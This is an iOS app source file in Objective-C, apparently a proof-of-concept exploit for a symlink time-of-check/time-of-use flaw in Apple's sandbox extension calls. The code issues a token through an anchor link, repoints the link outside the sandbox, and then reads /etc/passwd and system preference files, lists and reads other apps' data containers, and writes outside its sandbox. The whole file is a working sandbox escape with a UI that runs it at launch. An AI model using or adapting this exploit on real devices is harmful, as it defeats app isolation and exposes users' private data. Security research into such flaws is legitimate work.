// AirLift2 - sandbox_extension issue/consume TOCTOU (no NOFOLLOW)
// 原理: sandbox_extension_issue_file 在签发时解析符号链接，但不强制
// SANDBOX_EXTENSION_NOFOLLOW；签发后把链接换成沙箱外目标，内核 consume 时
// 只比对 token 里的路径，不校验解析后的真实目标。
// 仅用于自有设备的安全研究。

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

typedef char *(*issue_fn)(const char *, const char *, uint64_t);
typedef int64_t (*consume_fn)(const char *);
typedef void (*release_fn)(int64_t);

static issue_fn p_issue;
static consume_fn p_consume;
static release_fn p_release;

static NSString *gLink;
static NSString *gAnchor;
static NSMutableString *gLog;
static UITextView *gTV;
static NSString *gLogPath;

static void flushTV(void) {
    if (!gTV) return;
    gTV.text = gLog;
    if (gLog.length > 1)
        [gTV scrollRangeToVisible:NSMakeRange(gLog.length - 1, 1)];
}

static void L(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[airlift2] %@", s);
    dispatch_async(dispatch_get_main_queue(), ^{
        [gLog appendString:s];
        [gLog appendString:@"\n"];
        flushTV();
    });
}

static void setupOnce(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSString *tmp = NSTemporaryDirectory();
        gLink = [tmp stringByAppendingPathComponent:@"l"];
        gAnchor = [tmp stringByAppendingPathComponent:@"s"];
        [@"anchor" writeToFile:gAnchor atomically:YES
                      encoding:NSUTF8StringEncoding error:nil];
        gLog = [NSMutableString string];
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        gLogPath = [docs stringByAppendingPathComponent:@"airlift2.log"];
    });
}

static void saveLog(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        [gLog writeToFile:gLogPath atomically:YES
                 encoding:NSUTF8StringEncoding error:nil];
    });
}

static void resolveSymbols(void) {
    void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
    if (!h) h = dlopen(NULL, RTLD_NOW);
    p_issue = (issue_fn)dlsym(h, "sandbox_extension_issue_file");
    p_consume = (consume_fn)dlsym(h, "sandbox_extension_consume");
    p_release = (release_fn)dlsym(h, "sandbox_extension_release");
    L(@"symbols: issue=%s consume=%s release=%s",
      p_issue ? "ok" : "NULL", p_consume ? "ok" : "NULL", p_release ? "ok" : "NULL");
}

static char *issueThroughAnchor(const char *cls) {
    setupOnce();
    if (!p_issue) return NULL;
    unlink(gLink.fileSystemRepresentation);
    if (symlink(gAnchor.fileSystemRepresentation, gLink.fileSystemRepresentation) != 0) {
        L(@"  symlink(anchor) failed: %s", strerror(errno));
        return NULL;
    }
    char *tok = p_issue(cls, gLink.fileSystemRepresentation, 0);
    if (!tok)
        L(@"  issue_file NULL (class=%s, errno=%s)", cls, strerror(errno));
    return tok;
}

static void repoint(const char *target) {
    unlink(gLink.fileSystemRepresentation);
    symlink(target, gLink.fileSystemRepresentation);
}

static NSData *escapedRead(NSString *target) {
    char *tok = issueThroughAnchor("com.apple.app-sandbox.read");
    if (!tok) return nil;
    repoint(target.fileSystemRepresentation);
    int64_t h = p_consume ? p_consume(tok) : -1;
    free(tok);
    NSError *err = nil;
    NSData *d = [NSData dataWithContentsOfFile:gLink options:0 error:&err];
    if (h > 0 && p_release) p_release(h);
    if (!d) L(@"  read failed: %@", err.localizedDescription);
    return d;
}

static NSArray<NSString *> *escapedList(NSString *dir) {
    char *tok = issueThroughAnchor("com.apple.app-sandbox.read");
    if (!tok) return @[];
    repoint(dir.fileSystemRepresentation);
    int64_t h = p_consume ? p_consume(tok) : -1;
    free(tok);
    NSMutableArray *out = [NSMutableArray array];
    DIR *dp = opendir(gLink.fileSystemRepresentation);
    if (dp) {
        struct dirent *e;
        while ((e = readdir(dp))) {
            if (strcmp(e->d_name, ".") && strcmp(e->d_name, ".."))
                [out addObject:[NSString stringWithUTF8String:e->d_name]];
        }
        closedir(dp);
    } else {
        L(@"  opendir failed: %s", strerror(errno));
    }
    if (h > 0 && p_release) p_release(h);
    return out;
}

static BOOL escapedWrite(NSString *target, NSData *data) {
    char *tok = issueThroughAnchor("com.apple.app-sandbox.read-write");
    if (!tok) return NO;
    repoint(target.fileSystemRepresentation);
    int64_t h = p_consume ? p_consume(tok) : -1;
    free(tok);
    BOOL ok = [data writeToFile:gLink options:0 error:nil];
    if (h > 0 && p_release) p_release(h);
    return ok;
}

static void runChecks(void) {
    @autoreleasepool {
        setupOnce();
        UIDevice *dev = [UIDevice currentDevice];
        L(@"=== sandbox_extension TOCTOU ===");
        L(@"%@ / iOS %@ / uid=%d", dev.model, dev.systemVersion, getuid());
        resolveSymbols();
        if (!p_issue || !p_consume) {
            L(@"关键符号缺失，无法继续");
            saveLog();
            return;
        }

        L(@"[1] baseline: read /etc/passwd without escape");
        NSData *plain = [NSData dataWithContentsOfFile:@"/etc/passwd"];
        L(@"    %@", plain ? @"READABLE (沙盒未拦)" : @"blocked");

        L(@"[2] escaped read /etc/passwd");
        NSData *pw = escapedRead(@"/etc/passwd");
        if (pw) {
            NSUInteger n = MIN((NSUInteger)100, pw.length);
            NSString *s = [[NSString alloc] initWithData:[pw subdataWithRange:NSMakeRange(0, n)]
                                                encoding:NSUTF8StringEncoding];
            L(@"    OK %lu bytes", (unsigned long)pw.length);
            L(@"    %@", [s stringByReplacingOccurrencesOfString:@"\n" withString:@" | "]);
        } else {
            L(@"    FAILED");
        }

        L(@"[3] escaped read .GlobalPreferences.plist");
        NSData *gp = escapedRead(@"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
        L(@"    %@", gp ? [NSString stringWithFormat:@"OK %lu bytes", (unsigned long)gp.length] : @"FAILED");

        L(@"[4] list other app containers");
        NSArray *dirs = escapedList(@"/var/mobile/Containers/Data/Application");
        L(@"    containers: %lu", (unsigned long)dirs.count);
        NSUInteger n = 0;
        for (NSString *uuid in dirs) {
            if (n++ >= 8) break;
            NSString *meta = [NSString stringWithFormat:
                @"/var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist",
                uuid];
            NSData *md = escapedRead(meta);
            NSString *bid = @"?";
            if (md) {
                id pl = [NSPropertyListSerialization propertyListWithData:md options:0 format:NULL error:nil];
                if ([pl isKindOfClass:[NSDictionary class]])
                    bid = pl[@"MCMMetadataIdentifier"] ?: @"?";
            }
            L(@"    %@ -> %@", [uuid substringToIndex:MIN((NSUInteger)8, uuid.length)], bid);
        }

        L(@"[5] escaped write /var/tmp");
        NSString *dst = [NSString stringWithFormat:@"/var/tmp/cl-%.8x.bin", arc4random()];
        NSData *payload = [@"airlift2" dataUsingEncoding:NSUTF8StringEncoding];
        BOOL w = escapedWrite(dst, payload);
        L(@"    write %@: %@", dst, w ? @"OK" : @"FAILED");
        if (w) {
            NSData *back = escapedRead(dst);
            L(@"    readback: %@", back ? @"OK" : @"FAILED");
            unlink(dst.fileSystemRepresentation);
        }
        L(@"=== done ===");
        L(@"log: %@", gLogPath);
        saveLog();
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *tv;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    setupOnce();
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    self.tv = [[UITextView alloc] initWithFrame:CGRectZero];
    self.tv.editable = NO;
    self.tv.textColor = [UIColor greenColor];
    self.tv.backgroundColor = [UIColor blackColor];
    self.tv.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    self.tv.translatesAutoresizingMaskIntoConstraints = NO;
    self.tv.text = @"booting...\n";
    gTV = self.tv;

    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    [btn setTitle:@"RUN" forState:UIControlStateNormal];
    [btn setTitleColor:[UIColor greenColor] forState:UIControlStateNormal];
    [btn addTarget:self action:@selector(run) forControlEvents:UIControlEventTouchUpInside];
    btn.translatesAutoresizingMaskIntoConstraints = NO;
    btn.titleLabel.font = [UIFont monospacedSystemFontOfSize:20 weight:UIFontWeightBold];

    UIButton *copy = [UIButton buttonWithType:UIButtonTypeSystem];
    [copy setTitle:@"COPY" forState:UIControlStateNormal];
    [copy setTitleColor:[UIColor cyanColor] forState:UIControlStateNormal];
    [copy addTarget:self action:@selector(copyLog) forControlEvents:UIControlEventTouchUpInside];
    copy.translatesAutoresizingMaskIntoConstraints = NO;

    [vc.view addSubview:self.tv];
    [vc.view addSubview:btn];
    [vc.view addSubview:copy];
    [NSLayoutConstraint activateConstraints:@[
        [self.tv.topAnchor constraintEqualToAnchor:vc.view.safeAreaLayoutGuide.topAnchor],
        [self.tv.leadingAnchor constraintEqualToAnchor:vc.view.leadingAnchor constant:8],
        [self.tv.trailingAnchor constraintEqualToAnchor:vc.view.trailingAnchor constant:-8],
        [self.tv.bottomAnchor constraintEqualToAnchor:btn.topAnchor constant:-8],

        [btn.centerXAnchor constraintEqualToAnchor:vc.view.centerXAnchor constant:-50],
        [btn.bottomAnchor constraintEqualToAnchor:vc.view.safeAreaLayoutGuide.bottomAnchor constant:-10],
        [copy.centerYAnchor constraintEqualToAnchor:btn.centerYAnchor],
        [copy.leadingAnchor constraintEqualToAnchor:btn.trailingAnchor constant:30],
    ]];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runChecks(); });
    return YES;
}

- (void)run {
    [gLog setString:@""];
    flushTV();
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runChecks(); });
}

- (void)copyLog {
    [UIPasteboard generalPasteboard].string = gLog ?: @"";
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
